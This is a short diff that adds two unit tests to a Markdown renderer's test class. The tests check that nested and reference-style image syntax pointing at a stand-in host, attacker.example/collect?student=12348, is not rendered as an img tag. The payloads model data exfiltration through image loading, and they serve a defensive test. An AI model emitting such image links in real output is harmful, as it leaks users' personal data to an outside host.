@@ -37,4 +37,19 @@ class MarkdownRendererTest {
         assertTrue(html.contains("Matrikel 12348"));
         assertTrue(html.contains("Ende"));
     }
+
+    @Test
+    void doesNotRenderNestedImages() {
+        String html = renderer.toHtml(
+                "![outer ![secret](https://attacker.example/collect?student=12348)](https://example.org/outer)");
+        assertFalse(html.contains("<img"));
+        assertFalse(html.contains("attacker.example"));
+    }
+
+    @Test
+    void doesNotRenderReferenceStyleImages() {
+        String html = renderer.toHtml("![x][r]\n\n[r]: https://attacker.example/collect?student=12348");
+        assertFalse(html.contains("<img"));
+        assertFalse(html.contains("attacker.example"));
+    }
 }
